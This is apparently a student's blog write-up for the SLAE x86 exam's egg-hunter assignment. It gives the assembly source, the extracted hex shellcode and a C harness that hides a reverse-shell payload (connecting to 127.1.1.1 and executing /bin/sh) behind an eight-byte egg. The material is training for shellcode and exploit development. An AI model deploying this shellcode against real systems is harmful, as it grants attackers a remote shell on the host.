---
layout: post
title:  "SLAE x86 Exam - Assignment 3"
categories: certs slae 
---


## Assignment #3 - Egg hunter
_Student ID: **PA-7854**_

The assignment indications are as follows:
* _Study about Egg hunter shellcode_
* _Create a demo that can be configurable for different payloads_


In summary this are the steps to be taken:
1. Overview
2. Code

The code is available at [my github repo](https://github.com/0xKiewicz/SLAE)

#### Overview
This was a new concept for me, so I spent some time to learn about _Egg hunters_ on [this paper](http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf).
In short, it's a multi-stage shellcode. When you have a limited amount of bytes in memory and that prevents from running your whole shellcode, you can create a small chunk of code that looks for in (readable) memory for the next-larger code to be executed.
The egg is generally a series of 8 bytes (4 bytes repeated twice), so that we can identify the new piece of code. These 4 bytes need to be unique, an uncommon series of _opcodes_ is a good option, such as `0xF5F5F5F5` which states for `cmc`. 
In order to go through memory to search for the egg we need to check first if we have access to that piece of memory (otherwise we will get an _segmentation fault_), remember we do not have access to memory within the _kernel space_.
To achieve this, we can use `sigaction` syscall (as stated in previous pointed paper).
By looking at the `man page` we can see how it works:
```c
#include <signal.h>

 int sigaction(int signum, const struct sigaction *act, struct sigaction *oldact);

--snip--

       The sigaction structure is defined as something like:

           struct sigaction {
               void     (*sa_handler)(int);
               void     (*sa_sigaction)(int, siginfo_t *, void *);
               sigset_t   sa_mask;
               int        sa_flags;
               void     (*sa_restorer)(void);
           };

```

We know that `sigaction` interrupt value is `0x43` (67 decimal). This is in short what the program will do:
1. Set up _PAGE SIZE_
2. Loop until an EFAULT is not triggered
3. Loop byte by byte and look for an egg (or EFAULT)
4. Realign page size and go back to step 1
 
#### 2. Code
Here is the full code for the egg hunter:

```nasm
; Egg hunter for the Linux x86 architecture
; Leo Juszkiewicz (@_Kiewicz)
; GPL License
; $ nasm -f elf32 egg_hunter.asm -o egg_hunter.o
; $ ld -o egg_hunter egg_hunter.o
; ./egg_hunter

global _start

section .text
_start:

set_page_size:
	xor ecx, ecx	; clearing out ECX
	add cx, 0xfff	; Page size = 4095 (getconf PAGE_SIZE)

go_through:
	inc ecx		; increase ECX by 1 

	xor eax, eax	; clearing out EAX
	mov al, 0x43	; sigaction = 0x43
	int 0x80	; interruptor

	cmp al, 0xf2	; If EFAULT is reached, AL = 0xf2
	jz set_page_size; If EFAULT is reached, go back to top

	mov eax, 0xF5F5F5F5 ; Egg

	mov edi, ecx	; Address of memory into EDI before calling SCASD
	; EDI == ECX?
	scasd		; This compares by 4 bytes
	; If EDI != ECX go to top
	jnz go_through  
	; If True check next 4 bytes...
	scasd
	; If second 4 bytes didnt match go back to top
	jnz go_through 
			
	; If all bytes match...
	jmp edi
```

We will assemble and link so that we can add the shellcode to the C file and run it.
```bash
$ nasm -f elf32 egg.nasm -o egg.o
$ ld -o egg egg.o
$ for i in $(objdump -d -M intel $f | grep "^ " | cut -f2); do echo -n '\x'$i; done 
\x31\xc9\x66\x81\xc1\xff\x0f\x41\x31\xc0\xb0\x43\xcd\x80\x3c\xf2\x74\xee\xb8\xf5\xf5\xf5\xf5\x89\xcf\xaf\x75\xeb\xaf\x75\xe8\xff\xe7
```

No NULL bytes seem to appeared. Now we add both the egg with the egghunter code to the C file:
```c
#include<stdio.h>
#include<string.h>

// egg = CMC
#define egg "\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5"

unsigned char egghunter[] = "\x31\xc9\x66\x81\xc1\xff\x0f\x41\x31\xc0\xb0\x43\xcd\x80\x3c\xf2\x74\xee\xb8\xf5\xf5\xf5\xf5\x89\xcf\xaf\x75\xeb\xaf\x75\xe8\xff\xe7";

unsigned char code[] = egg "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x31\xff\x66\xb8\x67\x01\xb3\x02\xb1\x01\xb2\x06\xcd\x80\x89\xc3\x68\x7f\x01\x01\x01\x66\x68\x30\x39\x66\x6a\x02\x89\xe1\x66\xb8\x6a\x01\xb2\x10\xcd\x80\x31\xc9\xb1\x02\x31\xc0\xb0\x3f\xcd\x80\xfe\xc9\x79\xf8\x31\xc9\xb0\x0b\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xf1\x89\xf2\xcd\x80";
int main()
{
  printf("Shellcode egghunter lenght: %d\n", strlen(egghunter));
	printf("Shellcode code Length with egg:  %d\n", strlen(code));

	int (*ret)() = (int(*)())egghunter;

	ret();
	return 0;
}
```

Compile and done:
```bash
gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
./shellcode
```
